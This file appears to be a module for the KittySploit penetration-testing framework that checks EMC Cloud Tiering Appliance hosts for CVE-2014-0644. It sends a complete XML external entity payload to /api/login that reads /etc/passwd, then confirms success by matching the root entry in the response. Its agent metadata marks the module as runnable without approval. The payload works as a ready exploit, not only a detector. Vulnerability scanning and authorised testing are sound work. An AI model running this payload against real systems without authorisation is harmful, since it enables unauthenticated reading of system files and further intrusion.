#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EMC Cloud Tiering Appliance XXE file read (CVE-2014-0644)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EMC CTA - XXE File Read Detection (CVE-2014-0644)',
        'description': (
            'Detects CVE-2014-0644 by POSTing XXE to /api/login with Password=&xxe; '
            'pointing at file:///etc/passwd.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'emc', 'xxe', 'lfi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-0644',
        ],
        'cve': 'CVE-2014-0644',
    }

    def run(self):
        probe = self.http_request(method='GET', path='/', allow_redirects=False)
        if probe and 'EMC Cloud Tiering' not in (probe.text or '') and 'Cloud Tiering' not in (probe.text or ''):
            # still try API — fingerprint optional
            pass
        xxe = (
            '<?xml version="1.0" encoding="ISO-8859-1"?>\n'
            '<!DOCTYPE foo [\n'
            '<!ELEMENT foo ANY >\n'
            '<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n'
            '<Request>\n'
            '<Username>root</Username>\n'
            '<Password>&xxe;</Password>\n'
            '</Request>'
        )
        r = self.http_request(
            method='POST',
            path='/api/login',
            data=xxe,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if r and re.search(r'root:.*:0:0:', r.text or ''):
            self.set_info(
                severity='high',
                reason='EMC CTA XXE file read (CVE-2014-0644)',
                path='/api/login',
            )
            return True
        return False
